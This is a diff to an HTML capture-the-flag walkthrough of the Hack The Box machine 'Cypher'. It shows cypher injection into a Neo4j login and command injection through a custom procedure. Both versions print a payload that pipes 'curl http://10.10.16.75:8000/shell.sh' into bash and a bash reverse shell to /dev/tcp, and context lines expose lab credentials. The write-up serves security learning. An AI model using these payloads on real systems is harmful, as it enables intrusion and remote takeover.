@@ -70,7 +70,8 @@
 Initial reconnaissance revealed a login form backed by a Neo4j graph database.
 Testing for cypher injection by inserting a single quote character triggered database errors, confirming the vulnerability in the authentication endpoint.
 Directory enumeration exposed a /testing endpoint containing a downloadable JAR file. Decompiling the Java archive with jd-gui revealed custom Neo4j procedures, including a vulnerable custom.getUrlStatusCode function that executed system commands via curl. The procedure constructed shell commands by directly concatenating user input.
-Exploiting the cypher injection, I crafted a payload that called the vulnerable procedure: test' RETURN h.value as hash UNION CALL custom.getUrlStatusCode('http:thing; curl http://10.10.16.75:8000/shell.sh | bash') YIELD statusCode AS hash RETURN hash;//.
+Exploiting the cypher injection, I crafted a payload that called the vulnerable procedure:
+<code>RETURN h.value as hash UNION CALL custom.getUrlStatusCode('http:thing; curl http://10.10.16.75:8000/shell.sh | bash') YIELD statusCode AS hash RETURN hash;//</code>
 The semicolon separator bypassed output redirection to /dev/null, allowing command execution and establishing a reverse shell as the neo4j user.</p>
 <p>Local enumeration revealed user graphasm's home directory containing a bbot configuration file with Neo4j credentials (neo4j:cU4btyib.20xtCMCXkBmerhK).
 These credentials provided SSH access as graphasm, who had sudo privileges to run the bbot OSINT tool as root.</p>
@@ -83,14 +84,15 @@ These credentials provided SSH access as graphasm, who had sudo privileges to ru
 <p>The demo button redirects me to a login form. I have no credentials, so I'll take a look at the page's source code.</p>
 <p><img alt="script" src="../images/Cypher/script.png" /></p>
 <p>This website uses Neo4j as a database. I will check for cypher injection in the login fields.</p>
-<p>I'll do so by adding a single <code>'</code> character into the username field.</p>
-<p><img alt="error" src="../images/Cypher/error.png" /></p>
-<p>I tried to abuse this injection, however, I was unable to login as the admin. I'll fuzz for directories to see if there is anything else that I can use.</p>
+<p>For this, I will use burpsuite to keep everything tidy and easy to see.</p>
+<p><img alt="query" src="../images/Cypher/query.png" /></p>
+<p>The query it is running under the hood is:</p>
+<p><code>MATCH (u:USER) -[:SECRET]-&gt; (h:SHA1) WHERE u.name = 'INPUT' return h.value as hash</code></p>
+<p>Where INPUT is the value put into the username field.</p>
 <h2>Fuzzing the website</h2>
 <p><code>dirsearch -u http://cypher.htb/ --exclude-sizes=22B</code></p>
 <p><img alt="dir" src="../images/Cypher/dir.png" /></p>
-<p>There are two things that interest me here. First, there is an api endpoint, which I think could have something to do with the login process.</p>
-<p>There is also a <code>testing</code> endpoint. I'll begin by checking that one.</p>
+<p>There is a <code>testing</code> endpoint. I'll check it out right away.</p>
 <p><img alt="jar" src="../images/Cypher/jar.png" /></p>
 <p>There is a JAR(Java archive) file available for download. I'll get it onto my box to examine it.</p>
 <p>I will use jd-gui to decompile the archive.</p>
@@ -181,14 +183,9 @@ These credentials provided SSH access as graphasm, who had sudo privileges to ru
 
 <p>If I can somehow call the <code>custom.getUrlStatusCode</code> procedure, I'll be able to achieve code execution. By passing in the http address like this <code>custom.getUrlStatusCode('http://10.10.16.75/test')</code>, I'll be able to make it call back to my server.</p>
 <h2>Shell as neo4j</h2>
-<p>Just to confirm the target endpoint, I ran dirsearch again.</p>
-<p><img alt="auth" src="../images/Cypher/auth.png" /></p>
-<p>I will send my command to that endpoint. That should allow me to interact with the login fields.</p>
-<p><code>export cmd="test' RETURN h.value as hash UNION CALL custom.getUrlStatusCode('http://10.10.16.75:8000/test') YIELD statusCode AS hash RETURN hash;//"</code></p>
-<p>I exported the command to avoid issues with the quote characters.</p>
-<p>Next, I will use curl to send this command to the auth endpoint.</p>
-<p><code>curl -X POST "http://cypher.htb/api/auth" -H "Content-Type: application/json" --data "{\"username\": \"${cmd}\", \"password\": \"pass\"}"</code></p>
-<p>It returns a <code>{"detail":"Invalid credentials"}</code> error message, but ended up reaching out to my python server regardless.</p>
+<p>After much searching and testing, I found a command that successfully made contact with my server.</p>
+<p><code>RETURN h.value as hash UNION CALL custom.getUrlStatusCode('http://10.10.16.75:8000/test') YIELD statusCode AS hash RETURN hash;//"</code></p>
+<p>It returns an <code>Invalid credentials</code> error message, but reaches out to my python server regardless.</p>
 <p><img alt="python" src="../images/Cypher/python.png" /></p>
 <p>I'll prepare a single reverse shell file, and I'll modify my command slightly.</p>
 <div class="codehilite"><pre><span></span><code># shell.sh
@@ -198,9 +195,9 @@ These credentials provided SSH access as graphasm, who had sudo privileges to ru
 bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.75/9001 0&gt;&amp;1&#39;
 </code></pre></div>
 
-<p>However, nothing happens to my netcat listener. This is because of the <code>-o /dev/null</code> part in the vulnerable bash command. It'll throw away everything that curl tries to pass, but this can be solved rather easily.</p>
-<p>I'll add a separator <code>;</code> at the end, and then I'll repeat the curl command, which should work as intended. I'll then pipe the shell command into bash.</p>
-<p><code>export cmd="test' RETURN h.value as hash UNION CALL custom.getUrlStatusCode('http:thing; curl http://10.10.16.75:8000/shell.sh | bash') YIELD statusCode AS hash RETURN hash;//"</code></p>
+<p>However, nothing happens on my netcat listener. This is because of the <code>-o /dev/null</code> part in the vulnerable bash command. It'll throw away everything that curl tries to pass, aside from the grabbed status code. This can be solved rather easily.</p>
+<p>I'll add a separator <code>;</code> at the end, and then I'll repeat the curl command, which should work as intended. I'll then pipe the shell to bash.</p>
+<p><code>RETURN h.value as hash UNION CALL custom.getUrlStatusCode('http:thing; curl http://10.10.16.75:8000/shell.sh | bash') YIELD statusCode AS hash RETURN hash;//"</code></p>
 <p>The shell hit my listener almost instantly.</p>
 <p><img alt="shell" src="../images/Cypher/shell.png" /></p>
 <p>On the box, I began searching around and found a user whose home directory I could enter.</p>
